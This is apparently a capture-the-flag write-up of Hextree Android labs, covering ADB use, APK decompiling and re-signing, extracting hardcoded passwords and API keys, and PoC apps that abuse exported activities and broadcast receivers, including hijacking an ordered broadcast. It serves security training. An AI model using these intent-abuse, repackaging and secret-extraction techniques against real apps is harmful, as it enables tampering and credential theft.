# Flag 1 — Installing and Launching an APK with ADB

Installed the APK using:

```bash
adb install adb_test_application.apk
```

Then launched the main activity using:

```bash
adb shell am start io.hextree.adbtestapplication/.MainActivity
```

The application opened successfully and displayed the flag.

Flag : `HXT{Ready-to-Android}`


# Flag 2 — Finding a Hidden Activity

Used `dumpsys` to inspect the package and find the hidden activity:

```bash
adb shell dumpsys package io.hextree.adbtestapplication
```

Found and launched `HiddenActivity`:

```bash
adb shell am start io.hextree.adbtestapplication/.HiddenActivity
```

Flag : `HXT{not-so-hidden-activity}`

# Flag 3 — Finding Logs with Logcat

Used `logcat` to monitor logs from `MainActivity`:

```bash
adb logcat -v brief "MainActivity:V *:S"
```

Found the flag in the logs.

Flag : `HXT{log-all-the-cats}`

# Reverse Engineering Android Applications
 
# Flag 1 — Finding a Secret Activity

Installed the APK and decompiled it using:

```bash
apktool d io.hextree.reversingexample.apk
```

Checked `AndroidManifest.xml` and found `SecretActivity`.

Launched it using ADB:

```bash
adb shell am start io.hextree.reversingexample/.SecretActivity
```

The flag was displayed in the activity.

Flag : `HXT{A-not-so-secret-activity}`


# Flag 2 — Patching an Unreachable Activity

The `AndroidManifest.xml` contained an `UnreachableActivity` with `exported="false"`, which prevented it from being launched from outside the application.

First, decompiled the APK:

```bash
apktool d io.hextree.reversingexample.apk
```

Edited the `AndroidManifest.xml` and changed:

```xml
android:exported="false"
```

to:

```xml
android:exported="true"
```

Since the APK was modified, it needed to be rebuilt and signed before Android would allow it to be installed. Generated a signing key using:

```bash
keytool -genkey -v -keystore research.keystore -alias research_key -keyalg RSA -keysize 2048 -validity 10000
```

While rebuilding, the APK initially gave a **failed to extract native libraries** error. Changed `extractNativeLibs` to `true` in the manifest to resolve this.

Rebuilt the modified APK:

```bash
apktool b io.hextree.reversingexample
```

Signed the rebuilt APK using the generated keystore:

```bash
jarsigner -verbose -keystore research.keystore app.apk research_key
```

Uninstalled the original APK and installed the modified version:

```bash
adb uninstall io.hextree.reversingexample
adb install app.apk
```

Finally, launched the now-accessible `UnreachableActivity` using ADB, which displayed the flag.

# Flag 3 — Finding a Hardcoded Password with JADX

Installed the APK using ADB and opened it in JADX for decompilation:

```bash
adb install io.hextree.reversingexample.apk
jadx-gui io.hextree.reversingexample.apk
```

Located the activity responsible for checking the password and found the following condition:

```java
if (passwordText.equals(SecretKeeper.getSecretPassword()))
```

Following `getSecretPassword()` in JADX revealed that the password was hardcoded and returned:

```java
iAmHardcoded
```

Entered this password into the application, which revealed the flag.

Flag : `HXT{hardcoded-secrets-are-bad}`

# Flag 4 — Finding a Password in Resources

Opened the next activity in JADX and found the password check:

```java
if (passwordText.equals(LoggedInActivity.this.getString(R.string.secret2)))
```

This showed that the password was stored in the app's resources. Checked `strings.xml` and found:

```xml
<string name="secret2">VeryResourcefulSecret</string>
```

Entered the password into the application, which revealed the flag.

Flag : `HXT{resources-are-no-match-for-me}`

# Flag 5 — Finding a Password in Native Code using JNI

The third password was stored in the native JNI library instead of the Java code. After decompiling the APK with `apktool`, located the native library:

```text
lib/x86_64/libexample_nativelib.so
```

Used `strings` and `grep` to search for the secret:

```bash
strings lib/x86_64/libexample_nativelib.so | grep Secret
```

This returned:

```text
nativeSecretsCanBeFoundToo
```

Used `nativeSecretsCanBeFoundToo` as the password, which revealed the flag.

Flag : `HXT{from-java-to-native}`

Yes, that is the important code to show in the write-up. It makes the path to the key much clearer.

# Flag 6 — Finding an API Key in Resources

Opened the APK in **JADX-GUI** and used **Global Search** to search for:

```text
http
```

This led to the code making the weather API request. While checking how the request was authenticated, I found:

```java
d(d.a(str, "HextreeForecastUSA/v4.x", this.f452c.getString(R.string.ApiKey)));
```

The important part was:

```java
getString(R.string.ApiKey)
```

This showed that the API key wasn't hardcoded directly in the Java code. Instead, it was being loaded from the `ApiKey` string resource.

I followed `R.string.ApiKey` to `strings.xml`, where I found the API key:

```xml
<string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

Flag : `HXT{android-api-key-b1872g}`


# Flag 7 — Calling the Weather API Directly

After finding the API endpoint and the API key, I opened the endpoint in **Burp Suite's built-in browser** and intercepted the request. I then sent it to **Repeater**, where I could modify the request and see how the server responded.

I went back to the JADX code to understand what parameters the application was adding to the API request. In the `b()` method, I found:

```java
private String b(String str) {
    StringBuffer stringBuffer = new StringBuffer();
    stringBuffer.append("?whichClient=NDFDgen");
    stringBuffer.append("&zipCodeList=");
    stringBuffer.append(str);
    stringBuffer.append(c());
    return stringBuffer.toString();
}
```

This showed me that the request uses `whichClient=NDFDgen` and takes the ZIP code through the `zipCodeList` parameter. I used the ZIP code `42`, which I had already found from the application's ZIP-code check.

I then followed the `c()` method to see what other parameters were being added:

```java
private StringBuffer c() {
    StringBuffer stringBuffer = new StringBuffer();
    stringBuffer.append("&product=time-series&begin=");

    try {
        stringBuffer.append(
            URLEncoder.encode(f449d.format(new Date()), "UTF-8")
        );
    } catch (UnsupportedEncodingException unused) {
    }

    stringBuffer.append("&maxt=maxt");
    stringBuffer.append("&mint=mint");
    stringBuffer.append("&dew=dew");
    stringBuffer.append("&appt=appt");
    stringBuffer.append("&wx=wx");
    stringBuffer.append("&icons=icons");
    stringBuffer.append("&wwa=wwa");
    stringBuffer.append("&Submit=Submit");

    return stringBuffer;
}
```

From this, I added the following parameters to the request in Repeater:

```text
product=time-series
begin=<date>
maxt=maxt
mint=mint
dew=dew
appt=appt
wx=wx
icons=icons
wwa=wwa
Submit=Submit
```

I also added the API key I found in the previous flag as the `X-API-KEY` header:

```http
X-Api-Key: HXT{android-api-key-b1872g}
```

While testing the request, I got an error related to the `begin` date. I went back to JADX and checked how the application formats the date. I found:

```java
private static final SimpleDateFormat f449d =
    new SimpleDateFormat("yyyy-MM-dd'T'HH:mm");
```

So I changed the `begin` parameter to follow this format. In the request, it appeared URL-encoded as:

```text
begin=2026-09-08T13%3A00
```

After putting the API key, ZIP code, client, product, date, and the remaining parameters together, the request looked like:

```http
GET /xml/SOAP_server/ndfdXMLclient.php?whichClient=NDFDgen&zipCodeList=42&product=time-series&begin=2026-09-08T13%3A00&maxt=maxt&mint=mint&dew=dew&appt=appt&wx=wx&icons=icons&wwa=wwa&Submit=Submit HTTP/2
Host: ht-api-mocks-lcfc4kr5oa-uc.a.run.app
User-Agent: HextreeForecastUSA/v4.x
X-Api-Key: HXT{android-api-key-b1872g}
```

I sent the modified request through Repeater and checked the response. The flag was included in the API response:

```text
HXT{android-api-h192gsa0}
```

**Flag:** `HXT{android-api-h192gsa0}`

# Flag — Extracting the API Key from Native Code

After opening the APK in **JADX-GUI**, I found that the API key was not directly visible in the Java code. Instead, the application was using a native library from the `lib` folder.

The `lib` folder contained different versions of the library for different architectures. Since the application was running on an emulator, I focused on the native library that matched the emulator's architecture.

I initially considered using **Ghidra** to reverse engineer the native library, but while inspecting the library I found an exported JNI function:

```text
Java_io_Hextree_USA_internetUtil_getKey
```

The function name gave me useful information. It showed that the native function was connected to the `InternetUtil` class and the native method `getKey`.

Instead of completely reversing the native binary, I decided to recreate the Java side of the JNI interface and call the existing native function.

I created the following class:

```java
package io.hextree.weatherusa;

public class InternetUtil {

    private static native String getKey(String str);

    public static String solve() {
        System.loadLibrary("native-lib");
        return getKey("moiba1cybar8smart4sheriff4securi");
    }
}
```

The important part was:

```java
private static native String getKey(String str);
```

This declares a native method without providing its implementation in Java. The implementation is inside the native library.

I then loaded the library using:

```java
System.loadLibrary("native-lib");
```

This makes the native functions from `native-lib` available to the application process.

After loading the library, I called the native function:

```java
return getKey("moiba1cybar8smart4sheriff4securi");
```

I used the parameter required by the native function and returned whatever value it produced.

Finally, I called `solve()` from my `MainActivity` and logged the result:

```java
Log.d("FLAG", InternetUtil.solve());
```

After running the application, I checked **Logcat** and found:

```text
HXT{obfuscated-api-key-asb126us}
```

So I was able to extract the API key without fully reversing the native library in Ghidra. By finding the JNI function, recreating the corresponding Java interface, loading the existing library, and calling the native method, I could directly obtain its return value.

**Flag:** `HXT{obfuscated-api-key-asb126us}`

# Flag 1 — Basic Exported Activity

We were given an Android application containing multiple levels, with one flag for each level.

For the first level, I checked the `AndroidManifest.xml` and found that `Flag1Activity` was exported:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true" />
```

Since the activity was exported, I could launch it directly using ADB:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity
```

The activity opened and displayed the flag.

Flag : `HXT{basic-exported-activity-1bh7sd}`

# Flag 2 — Intent with Action

For this level, `Flag2Activity` was exported, but simply launching it was not enough. I checked the activity code and found that it only calls `success()` when the Intent contains the required action:

```java
String action = getIntent().getAction();

if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}

success(this);
```

So I launched the activity with the required Intent action:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```

The condition was satisfied and the flag was displayed.

Flag : `HXT{intent-actions-activity-dsj198w}`

# Flag 3 — Intent with Action and Data

For this level, `Flag3Activity` was also exported, but it required **two conditions** to be satisfied before calling `success()`.

Looking at the activity code, I found that it first checks the Intent action:

```java
String action = intent.getAction();

if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
```

So the Intent needed to contain:

```text
io.hextree.action.GIVE_FLAG
```

It then checks the Intent's data:

```java
Uri data = intent.getData();

if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
    return;
}
```

Therefore, both the **action** and **data URI** had to match the expected values.

I launched the activity using ADB with `-a` to specify the action and `-d` to specify the data:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d https://app.hextree.io/map/android
```

Both conditions were satisfied and the activity called `success()`, displaying the flag.

Flag : `HXT{intent-uri-data-sda982bs}`

# Flag 4 — Intent State Machine

For this level, `Flag4Activity` was exported, but simply launching it did not give the flag. After checking the activity code, I found that it checks the state value before showing the flag :

```java
public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);
}
```

The states had to be reached in order:

INIT - PREPARE - BUILD  - GET_FLAG

Once the activity reached the `GET_FLAG` state, the code called `success()`.

I sent the required actions one by one:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
```

Finally, launched the activity again:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity
```

The state machine reached `GET_FLAG` and the flag was displayed.

Flag : `HXT{sometimes-require-multiple-calls-5133au2}`

## Flag 5 — Intent in Intent

For this level, `Flag5Activity` expects an **Intent inside another Intent**. Looking at the activity code, I found that it retrieves the nested Intent using:

```java
Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
```

The nested Intent needed to contain `return = 42`. It then checks for another Intent called `nextIntent`, which must contain `reason = "back"`.

Instead of manually sending the Intent from ADB, I created a small PoC Android app with a button that constructs the required nested Intent and launches `Flag5Activity`.

The button's click handler was:

```java
btn.setOnClickListener(v -> {
    try {
        Intent innermost = new Intent();
        innermost.putExtra("reason", "back");

        Intent middle = new Intent();
        middle.putExtra("return", 42);
        middle.putExtra("nextIntent", innermost);

        Intent outer = new Intent();
        outer.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
        );
        outer.putExtra("android.intent.extra.INTENT", middle);

        startActivity(outer);
    } catch (Exception e) {
        Toast.makeText(this, "Exploit failed!", Toast.LENGTH_SHORT).show();
    }
});
```

Here, the `outer` Intent targets `Flag5Activity` and contains the `middle` Intent as `android.intent.extra.INTENT`. The `middle` Intent contains `return = 42` and the `innermost` Intent as `nextIntent`, which contains `reason = "back"`.

Once the button was clicked, all the required conditions were satisfied and `Flag5Activity` returned the flag.

Flag : `HXT{intent-in-intent-in-intent-298abso}`

# Broadcast Receivers

# Flag 16 — Basic Exposed Receiver

[svg](https://github.com/Abhijith-P-B/write-up/tree/main/Hextree#flag-16--basic-exposed-receiver)

After opening the application in **JADX**, I started by looking at `Flag16Activity`. The description pointed me towards `Flag16Receiver`, so I opened the receiver to understand how it could be triggered.

I found that `Flag16Receiver` extends `BroadcastReceiver`:

```java
public class Flag16Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-16";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag16Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (intent.getStringExtra("flag").equals(FlagSecret)) {
            success(context, FlagSecret);
        }
    }
}
```

The important part was:

```java
intent.getStringExtra("flag")
```

This showed that the receiver expects an extra named `flag`. I then checked the value of `FlagSecret`:

```java
public static String FlagSecret = "give-flag-16";
```

So I needed to send an Intent containing:

```text
flag=give-flag-16
```

Since this was a `BroadcastReceiver`, I knew I needed to use `sendBroadcast()` rather than `startActivity()`.

I then checked the application's `AndroidManifest.xml` and found:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
    android:enabled="true"
    android:exported="true"/>
```

The important part was:

```xml
android:exported="true"
```

This meant that the receiver was exposed and could be accessed by another application, including my PoC application.

I created an explicit broadcast in my PoC app and targeted the receiver directly:

```java
Intent intent = new Intent();

intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag16Receiver"
));

intent.putExtra("flag", "give-flag-16");

sendBroadcast(intent);
```

Here, `setComponent()` specifies the exact receiver that should receive the broadcast:

```text
io.hextree.attacksurface.receivers.Flag16Receiver
```

I then used `putExtra()` to provide the value expected by the receiver:

```text
flag = give-flag-16
```

Finally, `sendBroadcast()` sent the Intent to the exposed receiver.

I checked Logcat using:

```bash
adb logcat | grep "Flag16Receiver"
```

The logs showed that the broadcast reached the receiver and that the correct extra was received:

```text
09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Component] ComponentInfo{io.hextree.attacksurface/io.hextree.attacksurface.receivers.Flag16Receiver}
09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Extra:'flag']: give-flag-16
```

Since `give-flag-16` matched `FlagSecret`, the condition in `onReceive()` was satisfied and the receiver's `success()` method was executed.

The receiver then printed the generated flag to Logcat:

```text
09-14 15:49:43.649  3146  3146 I Flag16Receiver: Flag: HXT{basic-receiver-ds82s}
```

**Flag:** `HXT{basic-receiver-ds82s}`

# Flag 18 — Hijacking Broadcast Intent

[svg](https://github.com/Abhijith-P-B/write-up/tree/main/Hextree#flag-18--hijacking-broadcast-intent)

After opening the application in **JADX**, I went to `Flag18Activity` and looked at what happens inside `onCreate()`.

I found that the activity creates a broadcast with the action:

```java
Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
```

It also adds a `flag` extra and sends the Intent using `sendOrderedBroadcast()`:

```java
intent.putExtra("flag", this.f.appendLog(this.flag));
intent.addFlags(8);

sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent2) {
        String resultData = getResultData();
        Bundle resultExtras = getResultExtras(false);
        int resultCode = getResultCode();

        Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
        Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
        Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);

        if (resultCode != 0) {
            Utils.showIntentDialog(context, "BroadcastReceiver.onReceive", intent2);
            Flag18Activity flag18Activity = Flag18Activity.this;
            flag18Activity.success(flag18Activity);
        }
    }
}, null, 0, null, null);
```

Since the broadcast only specifies an action and does not target a particular application, I could register my own receiver for `io.hextree.broadcast.FREE_FLAG`.

The interesting part was that the target checks the result returned from the broadcast:

```java
int resultCode = getResultCode();

if (resultCode != 0) {
    ...
    flag18Activity.success(flag18Activity);
}
```

There was no validation of where that result came from. I could therefore make my receiver return a non-zero result code.

I created a `Flag18Receiver` in my PoC application:

```java
public class Flag18Receiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Log.i("Flag18Receiver", "Received FREE_FLAG");

        setResultCode(1);
    }
}
```

Then I registered it dynamically in my `Main_Hextree` activity:

```java
BroadcastReceiver receiver = new Flag18Receiver();

IntentFilter filter =
        new IntentFilter("io.hextree.broadcast.FREE_FLAG");

registerReceiver(
        receiver,
        filter,
        Context.RECEIVER_EXPORTED
);
```

I initially tried to launch `Flag18Activity` directly from my PoC, but this failed because the activity was declared as:

```xml
android:exported="false"
```

So instead, I started my PoC app first and registered the receiver. I then opened **Flag 18 through the Hextree application itself**.

When `Flag18Activity` started, it sent the `FREE_FLAG` ordered broadcast. My receiver caught it and executed:

```java
setResultCode(1);
```

This caused the receiver inside `Flag18Activity` to get a result code of `1`. Since the application checks:

```java
if (resultCode != 0)
```

the condition was satisfied and the success function was called.

The flag was then displayed:

```text
Flag: HXT{hijacking-broadcast-intent-as91}
```

